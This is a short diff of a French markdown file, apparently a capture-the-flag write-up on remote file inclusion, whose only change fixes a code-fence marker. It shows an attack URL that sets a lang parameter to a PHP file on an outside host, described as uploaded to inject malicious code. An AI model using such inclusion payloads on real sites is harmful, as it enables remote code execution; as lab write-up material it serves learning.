@@ -23,7 +23,7 @@ je upload ce fichier sur mon super serveur dans le but d'injecter ce code malici
 
 ```URL
 https://remote.secu-web.blackfoot.dev/index.php?lang=https://media.alors-la.center/s/0vyufe2p.php
-```URL
+```
 
 ![remote image](remote2.PNG "flaaaaaaaaag")
 
